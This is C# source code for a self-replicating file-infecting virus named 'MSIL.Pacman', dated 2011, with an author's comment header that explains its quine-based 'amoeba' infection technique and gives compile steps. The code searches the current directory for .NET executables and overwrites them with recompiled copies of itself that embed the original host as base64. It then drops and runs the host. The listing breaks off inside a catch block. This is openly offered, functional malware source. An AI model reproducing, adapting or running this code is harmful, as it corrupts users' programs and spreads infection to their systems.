/* MSIL.Pacman
 * alcopaul 
 * http://alcopaul.co.nr
 * may 09, 2011
 * 
 *  
 *  This virus demonstrates a new technique of infection (new kind of "amoeba infection technique") made possible by quining and .net's programmatic compiler calls.
 *  It embeds the host file inside the virus at source code level, thus making the host file very difficult to be recovered by antivirus programs.
 *  
 *  I named it "Pacman" because just like the computer game character that eats anything, the virus also kinda "eats" the target file. Also it's named after Manny Pacquiao, 
 *  the greatest pound for pound boxer in the world, who's also a Pinoy like me, hehehhe.
 *  
 * 
 *  Methods:
 * 
 *  1.) Searches for a target MSIL file in current directory (infects 1 msil file per run).
 *  2.) If found, checks "pacman" marker for infection. If not infected, reads the target MSIL file.
 *      a.) Converts the byte array of the target to base 64 representation.
 *      b.) Decompiles the virus / Recreates the source code of the virus and includes the base 64 representation of target.
 *      c.) Compiles the new source (now including the target file) programatically into the target's file name.
 *      d.) Appends "pacman" signature to the infected file.
 *      d.) Stops looking for files and spawns and executes the host file.
 *  3.) If not found (all msil files are infected or no msil file found), stops and spawns and executes the host file.
 * 
 *  
 *  Notes:
 *  
 *  1.) "database" variable is in long continous line. It's intended.
 *  2.) xtx[0] = the host's base64 representation.
 *  3.) First generation won't spawn a host file. xtx[0] = "TEST".
 *  4.) xtx[0] can store more than 100k bytes. Cool!
 *  5.) amoeba infection technique (coined by Peter Szor in his 2005 book "The Art of Computer Virus Research and Defense") was used by my old Visual Basic 6 virus, Sand.12300.
 *  
 *  Greets:
 *  
 *  philet0ast3r, SPTH, Metal, PSVX.org
 *   
 *  Compile:
 *  
 *  1.) open notepad
 *  2.) type "pacman"
 *  3.) save as sig.txt
 *  4.) csc /target:exe pacman.txt
 *  5.) copy /b pacman.exe+sig.txt
 * 
 *  
 * 
 */

// start virus source
using System;
using System.IO;
using System.CodeDom;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Reflection;
using System.Text;

namespace ConsoleApplication3
{
    class Program
    {
        private static string database = "TEST>dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLkNvZGVEb207DQp1c2luZyBTeXN0ZW0uQ29kZURvbS5Db21waWxlcjsNCnVzaW5nIE1pY3Jvc29mdC5DU2hhcnA7DQp1c2luZyBTeXN0ZW0uUmVmbGVjdGlvbjsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KDQpuYW1lc3BhY2UgQ29uc29sZUFwcGxpY2F0aW9uMw0Kew0KICAgIGNsYXNzIFByb2dyYW0NCiAgICB7DQogICAgICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBkYXRhYmFzZSA9ICI=>IjsNCiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICBBU0NJSUVuY29kaW5nIEFFID0gbmV3IEFTQ0lJRW5jb2RpbmcoKTsNCiAgICAgICAgICAgIHN0cmluZ1tdIHh0eCA9IGRhdGFiYXNlLlNwbGl0KG5ldyBjaGFyW10geyAnPicgfSk7DQogICAgICAgICAgICBNb2R1bGUgc2VsZiA9IEFzc2VtYmx5LkdldEV4ZWN1dGluZ0Fzc2VtYmx5KCkuR2V0TW9kdWxlcygpWzBdOw0KICAgICAgICAgICAgc3RyaW5nW10gaG9zdGZpbGVzID0gRGlyZWN0b3J5LkdldEZpbGVzKERpcmVjdG9yeS5HZXRDdXJyZW50RGlyZWN0b3J5KCksICIqLmV4ZSIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIGhvc3RmaWxlIGluIGhvc3RmaWxlcykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEFzc2VtYmx5TmFtZS5HZXRBc3NlbWJseU5hbWUoaG9zdGZpbGUpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZ2V0c2lnKHNlbGYuRnVsbHlRdWFsaWZpZWROYW1lKSA9PSBnZXRzaWcoaG9zdGZpbGUpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpbGVTdHJlYW0gZnM1ID0gbmV3IEZpbGVTdHJlYW0oaG9zdGZpbGUsIEZpbGVNb2RlLk9wZW5PckNyZWF0ZSwgRmlsZUFjY2Vzcy5SZWFkKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgaWNjcCA9IChpbnQpZnM1Lkxlbmd0aDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gYnl0ZXM0ID0gUmVhZChmczUsIGljY3AsIDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZzNS5DbG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBob3N0c291cmNlID0gZW5jb2RlYjY0KGJ5dGVzNCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIGNvZGV5ID0gZGVjb2RlYjY0KHh0eFsxXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIGNvZGV6ID0gZGVjb2RlYjY0KHh0eFsyXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIG1pZGNvZCA9IGhvc3Rzb3VyY2UgKyAiPiIgKyB4dHhbMV0gKyAiPiIgKyB4dHhbMl07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIHhjb2RleCA9IGNvZGV5ICsgbWlkY29kICsgY29kZXo7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYm9vbCBnID0gQnVpbGRFeGUoaG9zdGZpbGUsIHhjb2RleCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGcgPT0gdHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpbGVTdHJlYW0gZnM1NCA9IG5ldyBGaWxlU3RyZWFtKGhvc3RmaWxlLCBGaWxlTW9kZS5PcGVuT3JDcmVhdGUsIEZpbGVBY2Nlc3MuUmVhZCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBpY2NweCA9IChpbnQpZnM1NC5MZW5ndGg7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBieXRlczQ0ID0gUmVhZChmczU0LCBpY2NweCwgMCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZzNTQuQ2xvc2UoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZVN0cmVhbSBmczEgPSBuZXcgRmlsZVN0cmVhbShob3N0ZmlsZSwgRmlsZU1vZGUuT3Blbk9yQ3JlYXRlLCBGaWxlQWNjZXNzLldyaXRlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGVYKGZzMSwgYnl0ZXM0NCwgQUUuR2V0Qnl0ZXMoInBhY21hbiIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnMxLkNsb3NlKCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgUmFuZG9tIHJhbiA9IG5ldyBSYW5kb20oKTsNCiAgICAgICAgICAgIGludCB0eSA9IHJhbi5OZXh0KDIwMDApOw0KICAgICAgICAgICAgRmlsZVN0cmVhbSBmczExID0gbmV3IEZpbGVTdHJlYW0oInAiICsgdHkgKyAiaC5leGUiLCBGaWxlTW9kZS5PcGVuT3JDcmVhdGUsIEZpbGVBY2Nlc3MuV3JpdGUpOw0KICAgICAgICAgICAgV3JpdGVYKGZzMTEsIGRlY29kZWI2NGJ5dGUoeHR4WzBdKSwgQUUuR2V0Qnl0ZXMoInBhY21hbiIpKTsNCiAgICAgICAgICAgIGZzMTEuQ2xvc2UoKTsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIHggPSBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzcy5TdGFydCgicCIgKyB0eSArICJoLmV4ZSIpOw0KICAgICAgICAgICAgICAgIHguV2FpdEZvckV4aXQoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZmluYWxseQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZpbGUuRGVsZXRlKCJwIiArIHR5ICsgImguZXhlIik7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgc3RyaW5nIGdldHNpZyhzdHJpbmcgZmlsZW5hbWV4KQ0KICAgICAgICB7DQogICAgICAgICAgICBGaWxlU3RyZWFtIGZzNTUgPSBuZXcgRmlsZVN0cmVhbShmaWxlbmFtZXgsIEZpbGVNb2RlLk9wZW5PckNyZWF0ZSwgRmlsZUFjY2Vzcy5SZWFkKTsNCiAgICAgICAgICAgIGludCBpY2NwID0gKGludClmczU1Lkxlbmd0aDsNCiAgICAgICAgICAgIGJ5dGVbXSBieXRlczQgPSBSZWFkKGZzNTUsIDYsIGljY3AgLSA2KTsNCiAgICAgICAgICAgIGZzNTUuQ2xvc2UoKTsNCiAgICAgICAgICAgIEFTQ0lJRW5jb2RpbmcgemVuYyA9IG5ldyBBU0NJSUVuY29kaW5nKCk7DQogICAgICAgICAgICByZXR1cm4gemVuYy5HZXRTdHJpbmcoYnl0ZXM0KTsNCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBieXRlW10gUmVhZChGaWxlU3RyZWFtIHMsIGludCBsZW5ndGgsIGludCBjKQ0KICAgICAgICB7DQogICAgICAgICAgICBCaW5hcnlSZWFkZXIgdzMzID0gbmV3IEJpbmFyeVJlYWRlcihzKTsNCiAgICAgICAgICAgIHczMy5CYXNlU3RyZWFtLlNlZWsoYywgU2Vla09yaWdpbi5CZWdpbik7DQogICAgICAgICAgICBieXRlW10gYnl0ZXMyID0gbmV3IGJ5dGVbbGVuZ3RoXTsNCiAgICAgICAgICAgIGludCBudW1CeXRlc1RvUmVhZDIgPSAoaW50KWxlbmd0aDsNCiAgICAgICAgICAgIGludCBudW1CeXRlc1JlYWQyID0gMDsNCiAgICAgICAgICAgIHdoaWxlIChudW1CeXRlc1RvUmVhZDIgPiAwKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGludCBuID0gdzMzLlJlYWQoYnl0ZXMyLCBudW1CeXRlc1JlYWQyLCBudW1CeXRlc1RvUmVhZDIpOw0KICAgICAgICAgICAgICAgIGlmIChuID09IDApDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIG51bUJ5dGVzUmVhZDIgKz0gbjsNCiAgICAgICAgICAgICAgICBudW1CeXRlc1RvUmVhZDIgLT0gbjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHczMy5DbG9zZSgpOw0KICAgICAgICAgICAgcmV0dXJuIGJ5dGVzMjsNCiAgICAgICAgfQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgV3JpdGVYKEZpbGVTdHJlYW0gcywgYnl0ZVtdIGcsIGJ5dGVbXSBrKQ0KICAgICAgICB7DQogICAgICAgICAgICBCaW5hcnlXcml0ZXIgdyA9IG5ldyBCaW5hcnlXcml0ZXIocyk7DQogICAgICAgICAgICB3LkJhc2VTdHJlYW0uU2VlaygwLCBTZWVrT3JpZ2luLkJlZ2luKTsNCiAgICAgICAgICAgIHcuV3JpdGUoZyk7DQogICAgICAgICAgICB3LldyaXRlKGspOw0KICAgICAgICAgICAgdy5GbHVzaCgpOw0KICAgICAgICAgICAgdy5DbG9zZSgpOw0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIGJvb2wgQnVpbGRFeGUoc3RyaW5nIHpuYW1lLCBzdHJpbmcgY29kZXkpICAgICAgICAgIA0KICAgICAgICB7DQogICAgICAgICAgICBJQ29kZUNvbXBpbGVyIHZpYyA9IG5ldyBDU2hhcnBDb2RlUHJvdmlkZXIoKS5DcmVhdGVDb21waWxlcigpOw0KICAgICAgICAgICAgQ29tcGlsZXJQYXJhbWV0ZXJzIG9jcCA9IG5ldyBDb21waWxlclBhcmFtZXRlcnMoKTsNCiAgICAgICAgICAgIG9jcC5SZWZlcmVuY2VkQXNzZW1ibGllcy5BZGQoIlN5c3RlbS5kbGwiKTsNCiAgICAgICAgICAgIG9jcC5HZW5lcmF0ZUV4ZWN1dGFibGUgPSB0cnVlOw0KICAgICAgICAgICAgb2NwLkNvbXBpbGVyT3B0aW9ucyA9ICIvdGFyZ2V0OmV4ZSI7DQogICAgICAgICAgICBvY3AuT3V0cHV0QXNzZW1ibHkgPSB6bmFtZTsNCiAgICAgICAgICAgIENvbXBpbGVyUmVzdWx0cyB6cmVzdWx0cyA9IHZpYy5Db21waWxlQXNzZW1ibHlGcm9tU291cmNlKG9jcCwgY29kZXkpOw0KICAgICAgICAgICAgZm9yZWFjaCAoQ29tcGlsZXJFcnJvciBjZSBpbiB6cmVzdWx0cy5FcnJvcnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoY2UuRXJyb3JOdW1iZXIgKyAiOiAiICsgY2UuRXJyb3JUZXh0KTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaWYgKHpyZXN1bHRzLkVycm9ycy5Db3VudCA9PSAwKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBieXRlW10gZGVjb2RlYjY0Ynl0ZShzdHJpbmcgZG9ubnkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoZG9ubnkpOw0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBkZWNvZGViNjQoc3RyaW5nIGRvbm55KQ0KICAgICAgICB7DQogICAgICAgICAgICBieXRlW10gcGxhaW4gPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoZG9ubnkpOw0KICAgICAgICAgICAgcmV0dXJuIEVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhwbGFpbik7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgc3RyaW5nIGVuY29kZWI2NChieXRlW10gZ2dnKQ0KICAgICAgICB7DQogICAgICAgICAgICBBU0NJSUVuY29kaW5nIEFFID0gbmV3IEFTQ0lJRW5jb2RpbmcoKTsNCiAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKGdnZyk7DQogICAgICAgIH0NCiAgICB9DQp9";
        static void Main(string[] args)
        {
            ASCIIEncoding AE = new ASCIIEncoding();
            string[] xtx = database.Split(new char[] { '>' });
            Module self = Assembly.GetExecutingAssembly().GetModules()[0];
            string[] hostfiles = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe");
            foreach (string hostfile in hostfiles)
            {
                try
                {
                    AssemblyName.GetAssemblyName(hostfile);
                    if (getsig(self.FullyQualifiedName) == getsig(hostfile))
                        continue;
                    else
                        try
                        {
                            FileStream fs5 = new FileStream(hostfile, FileMode.OpenOrCreate, FileAccess.Read);
                            int iccp = (int)fs5.Length;
                            byte[] bytes4 = Read(fs5, iccp, 0);
                            fs5.Close();
                            string hostsource = encodeb64(bytes4);
                            string codey = decodeb64(xtx[1]);
                            string codez = decodeb64(xtx[2]);
                            string midcod = hostsource + ">" + xtx[1] + ">" + xtx[2];
                            string xcodex = codey + midcod + codez;
                            bool g = BuildExe(hostfile, xcodex);
                            while (g == true)
                            {
                                FileStream fs54 = new FileStream(hostfile, FileMode.OpenOrCreate, FileAccess.Read);
                                int iccpx = (int)fs54.Length;
                                byte[] bytes44 = Read(fs54, iccpx, 0);
                                fs54.Close();
                                FileStream fs1 = new FileStream(hostfile, FileMode.OpenOrCreate, FileAccess.Write);
                                WriteX(fs1, bytes44, AE.GetBytes("pacman"));
                                fs1.Close();
                                break;
                            }
                        }
                        catch
                        {
                            continue;
                        }
                    break;
                }
                catch
                {
                    continue;
                }
            }
            Random ran = new Random();
            int ty = ran.Next(2000);
            FileStream fs11 = new FileStream("p" + ty + "h.exe", FileMode.OpenOrCreate, FileAccess.Write);
            WriteX(fs11, decodeb64byte(xtx[0]), AE.GetBytes("pacman"));
            fs11.Close();
            try
            {
                System.Diagnostics.Process x = System.Diagnostics.Process.Start("p" + ty + "h.exe");
                x.WaitForExit();
            }
            catch
